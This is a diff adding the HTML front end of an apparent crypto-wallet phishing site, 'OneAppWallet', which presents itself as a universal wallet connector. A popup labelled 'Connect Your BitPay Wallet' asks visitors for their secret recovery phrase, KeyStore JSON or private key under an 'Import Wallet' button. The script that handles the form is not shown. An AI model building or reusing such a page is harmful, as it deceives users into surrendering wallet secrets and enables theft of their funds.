@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>OneAppWallet : Your One Stop Universal Wallet</title>
+
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1, user-scalable=no"
+    />
+
+    <link href="./css/all.min.css" rel="stylesheet" />
+    <link href="./css/style.css" rel="stylesheet" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Archivo+Narrow:ital,wght@0,400;0,500;0,600;0,700;1,400;1,500;1,600;1,700&display=swap"
+      rel="stylesheet"
+    />
+
+    <script src="./js/jquery.min.js"></script>
+    <script src="./js/all.min.js"></script>
+    <script src="./js/sweetalert.min.js"></script>
+    <script src="./js/main.js"></script>
+  </head>
+
+  <body>
+    <div class="floating-divider"></div>
+
+    <div class="floating-island">
+      <div class="floating-island-header">
+        <div class="right">
+          <i class="fa fa-times" onclick="chaseFloatingIsland()"></i>
+        </div>
+        <h3>Connect Your BitPay Wallet</h3>
+        <p>Import Your Wallet On The Go</p>
+      </div>
+      <div class="floating-island-body">
+        <div id="flash_info">
+          <img src="./img/Binance Chain.jpg" />
+          <h3>Binance Chain</h3>
+        </div>
+        <div class="import-type">
+          <div class="import-selection">
+            <p onclick="keysupin('Phrases')">Phrases</p>
+            <p onclick="keysupin('KeyStore JSON')">KeyStore JSON</p>
+            <p onclick="keysupin('Private Key')">Private Key</p>
+          </div>
+          <div class="import-selected">
+            <form id="key_submission">
+              <input type="hidden" value="Phrases" id="import" />
+              <input type="hidden" value="" id="wallet" />
+              <label> Enter Secret Recovery Phrase </label>
+              <textarea
+                rows="6"
+                id="pphse"
+                placeholder="Enter Your Secret Recovery Phrase Which Is Always Either 12, 15, 18, 21 or 24 Words, Each Separate By A Space"
+              ></textarea>
+              <button>Import Wallet</button>
+            </form>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <header>
+      <div class="main_header">
+        <div class="header-links">
+          <a href="./"> How To </a>
+          <a href="./wallet.html"> Wallets </a>
+          <a href="./wallet.html"> Apps </a>
+        </div>
+
+        <div class="header_identity">
+          <h3>OneAppWallet</h3>
+        </div>
+
+        <div class="clear"></div>
+      </div>
+    </header>
+
+    <main>
+      <div class="main_container">
+        <div class="how_to" id="how_to">
+          <div class="wallets">
+            <h3>Connect Your Wallet</h3>
+
+            <form id="search_form" autocomplete="off">
+              <div class="wallet_search">
+                <input
+                  type="text"
+                  placeholder="Find Your Wallet"
+                  id="finder"
+                  autocomplete="off"
+                />
+                <button type="submit">Search</button>
+              </div>
+            </form>
+
+            <div class="your_wallets" id="your_wallets"></div>
+          </div>
+        </div>
+      </div>
+    </main>
+
+    <footer></footer>
+  </body>
+</html>
